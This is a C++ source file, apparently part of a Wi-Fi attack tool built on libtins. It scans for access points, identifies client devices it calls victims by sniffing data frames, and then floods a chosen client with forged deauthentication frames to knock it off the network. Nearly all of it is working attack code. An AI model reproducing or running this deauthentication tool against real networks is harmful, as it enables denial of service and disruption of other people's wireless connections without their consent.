#include "nettools.h"
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/wireless.h>

std::string trim(const std::string& str, const std::string& whitespaces=" \t\r\n")
{
    std::string result("");

    size_t begin = str.find_first_not_of(whitespaces);
    size_t end = str.find_last_not_of(whitespaces);
    if (begin != std::string::npos && end != std::string::npos)
        result = str.substr(begin, end - begin + 1);

    return result;
}

bool NetTools::changechannel(uint32_t channel)
{
    struct iwreq wrq;
    int skfd = socket(AF_INET,SOCK_DGRAM,0);
    memset(&wrq,0,sizeof(wrq));
    strncpy(wrq.ifr_name, iface.c_str(), IFNAMSIZ);
    wrq.u.freq.e = 6;
    wrq.u.freq.m = Utils::channel_to_mhz(channel);
    if(ioctl(skfd,SIOCSIWFREQ,&wrq) < 0)
        return false;
    return true;
}

bool NetTools::StartFindAP(string iface, uint32_t channel)
{
    try {
        this->iface = trim(iface);
        this->mapAP.clear();
        this->channel = channel;
        if(changechannel(channel) != true)
            return false;
        flag = true;
        th = new thread(std::bind(&NetTools::FindAP,this));
    } catch(exception e) { return false; }

    return true;
}
void NetTools::StopFindAP(void)
{
    flag = false;
    try{
        th->detach();
    } catch(exception e) { }
}

void NetTools::FindAP(void)
{
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_filter("type mgt subtype beacon");
    config.set_rfmon(true);
    Sniffer sniffer(iface, config);

    while(flag)
    {
        PDU *pdu = sniffer.next_packet();
        const Dot11Beacon& beacon = pdu->rfind_pdu<Dot11Beacon>();
        if (!beacon.from_ds() && !beacon.to_ds())
        {
            if (mapAP.find(beacon.ssid()) == mapAP.end())
            {
                try {
                    mapAP.insert(std::pair<std::string, Tins::HWAddress<6> >(beacon.ssid(), beacon.addr2()));
                } catch (exception e) {  }
            }
        }
    }
}

bool NetTools::StartFindVic(string AP, string iface, uint32_t channel)
{
    try {
        this->AP = trim(AP);
        this->iface = trim(iface);
        this->mapVic.clear();
        this->channel = channel;

        if(changechannel(channel) != true)
            return false;
        flag = true;
        th = new thread(std::bind(&NetTools::FindVic,this));
    } catch(exception e) { return false; }

    return true;
}
void NetTools::StopFindVic(void)
{
    flag = false;
    try{
        th->detach();
    } catch(exception e) { }
}
void NetTools::FindVic(void)
{
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_filter("type data");
    config.set_rfmon(true);
    Sniffer sniffer(iface, config);

    while(flag)
    {
        PDU *pdu = sniffer.next_packet();
        const Dot11Data& data = pdu->rfind_pdu<Dot11Data>();

        if (data.addr1() == AP || data.addr2() == AP)
        {
            try {
                if(data.addr1() == AP)
                {
                    mapVic[data.addr2()]++;
                }
                else if(data.addr2() == AP)
                {
                        mapVic[data.addr1()]++;
                }
            } catch (exception e) {  }
        }
    }
}
bool NetTools::StartKill(string victim, string AP, string _iface, uint32_t channel)
{
    string buf;
    try{
        this->victim = trim(victim);
        this->AP = trim(AP);
        this->iface = trim(_iface);
        this->channel = channel;
        if(changechannel(channel) != true)
            return false;
        flag = true;
        th = new thread(std::bind(&NetTools::KillVictim,this));
    } catch(exception e) {
        return false;
    }
    return true;
}

void NetTools::StopKill(void)
{
    flag = false;
    try{
        th->detach();
    } catch(exception e) { }
}
void NetTools::KillVictim(void)
{
    PacketSender send;
        try {
        RadioTap r = RadioTap() / Dot11Deauthentication(AP,victim);
        r.channel(Utils::channel_to_mhz(channel),0x00a0);
        while(flag)
        {
            send.send(r,iface);
            usleep(500000);
        }
    } catch(exception e) { }
    return;
}

